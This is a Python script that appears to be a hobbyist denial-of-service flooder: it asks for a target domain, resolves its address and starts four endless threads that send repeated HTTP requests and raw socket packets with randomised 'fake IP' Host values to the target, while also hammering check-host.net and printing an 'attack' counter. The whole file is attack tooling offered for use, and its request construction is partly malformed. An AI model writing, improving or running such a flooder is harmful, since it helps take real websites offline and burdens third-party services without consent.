
#code=utf8
#lib
import requests
import socket
import random
import time
import datetime
import os
from random import randint
from time import sleep
from threading import Thread
from fake_useragent import UserAgent
#banner

import bannerSYS

#Fake user agent
ua = UserAgent()
header = {'User-Agent':str(ua.chrome)}
header2 = {'User-Agent':str(ua.chrome)}
header3 = {'User-Agent':str(ua.chrome)}
header4 = {'User-Agent':str(ua.chrome)}
header5 = {'User-Agent':str(ua.chrome)}


#take url
URL = input("[+]>>>TARGET DOMAİN: ")
print(">>[{}]".format(URL))
speed = input("[?]>>>SPEED SLEEP: ")
print(">>[{}]".format(speed))
from bannerSYS import start
print(start)
sleep(2)
#find ip address
ip = socket.gethostbyname(URL)
http_changer = "http://{}".format(URL)
#changer
target = "{}".format(ip)
port = 80
#attack packet number
attack_num = 0
#services
url = 'https://check-host.net/check-http?host={}'.format(URL)
url2 = 'https://check-host.net/check-ping?host={}'.format(URL)
url3 = 'https://check-host.net/check-ping?host={}'.format(URL)
url4 = 'https://check-host.net/check-ping?host={}'.format(URL)
url5 = 'https://check-host.net/check-ping?host={}'.format(URL)

#ATTACKER1
header11 = {'User-Agent':str(ua.chrome)}
     
def attacker_one():
    while True:

        istek = requests.get(url,headers=header)
        istek2 = requests.get(url2,headers=header2)
        istek3 = requests.get(url3,headers=header3)
        istek4 = requests.get(url4,headers=header4)
        istek5 = requests.get(url5,headers=header5)
        run = requests.get(http_changer,headers=header11)
        sonuc = run.status_code
        code1 = istek.status_code
        code2 = istek2.status_code
        code3 = istek3.status_code
        code4 = istek4.status_code
        code5 = istek5.status_code
   
        
        ip = "{}.{}.{}.{}".format(*__import__("random").sample(range(0,255),4))
        fake_ip = ip

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"),(target,port))
        global attack_num
        attack_num += 1
       
        s.close()

        info1 = """ 
      _____________________________________________________________________  
        HTTP PACKET : https://check-host.net/check-http?host={} / CODE: {}
      1 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      2 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      3 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      4 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      _____________________________________________________________________
      
      FAKE PACKET: {}    /   requests attack: {}:{}
        
        """.format(URL,code1,URL,code2,URL,code3,URL,code4,URL,code5,attack_num,URL,sonuc)
        print(info1)

        sleep(int(speed))
        os.system("cls")

    return ip,attack_num,code1,code2,code3,code4,code5


#fake header attacker two
header6 = {'User-Agent':str(ua.chrome)}
header7 = {'User-Agent':str(ua.chrome)}
header8 = {'User-Agent':str(ua.chrome)}
header9 = {'User-Agent':str(ua.chrome)}
header10 = {'User-Agent':str(ua.chrome)}

#attacker two and header12 for requests
header12 = {'User-Agent':str(ua.chrome)}
def attacker_two():
    while True:

        istek = requests.get(url,headers=header6)
        istek2 = requests.get(url2,headers=header7)
        istek3 = requests.get(url3,headers=header8)
        istek4 = requests.get(url4,headers=header9)
        istek5 = requests.get(url5,headers=header10)
        run2 = requests.get(http_changer,headers=header12)
        sonuc2 = run2.status_code
        code6 = istek.status_code
        code7 = istek2.status_code
        code8 = istek3.status_code
        code9 = istek4.status_code
        code10 = istek5.status_code
   
        
        ip2 = "{}.{}.{}.{}".format(*__import__("random").sample(range(0,255),4))
        fake_ip = ip2

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"),(target,port))
        global attack_num
        attack_num += 1
        s.close()

        info2 = """ 
      _____________________________________________________________________  
        HTTP PACKET : https://check-host.net/check-http?host={} / CODE: {}
      1 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      2 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      3 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      4 PİNG PACKET : https://check-host.net/check-ping?host={} / CODE: {}
      _____________________________________________________________________
      
      FAKE PACKET: {}    /   requests attack: {}:{}
        
        """.format(URL,code6,URL,code7,URL,code8,URL,code9,URL,code10,attack_num,URL,sonuc2)
        print(info2)

        sleep(int(speed))
        os.system("cls")
    return ip2,attack_num,code6,code7,code8,code9,code10
    


   

for t1 in range(2):

    thread = Thread(target=attacker_one)
    thread.start()


for t2 in range(2):

    thread = Thread(target=attacker_two)
    thread.start()

